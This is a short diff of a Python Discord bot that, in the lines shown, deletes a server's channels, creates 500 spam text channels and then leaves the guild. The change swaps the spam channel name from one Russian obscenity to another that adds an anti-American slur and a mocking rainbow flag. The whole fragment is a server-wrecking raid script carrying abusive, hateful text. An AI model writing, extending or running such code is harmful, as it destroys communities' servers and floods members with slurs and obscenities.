@@ -22,7 +22,7 @@ class MyClient(discord.Client):
             print('Канал', i, 'удалён!')
 
         while c < 500:
-            await guild.create_text_channel(name='сосите хуй )))')
+            await guild.create_text_channel(name='сосите хуй пиндосы🏳️‍🌈')
             c += 1
         await guild.leave()
 
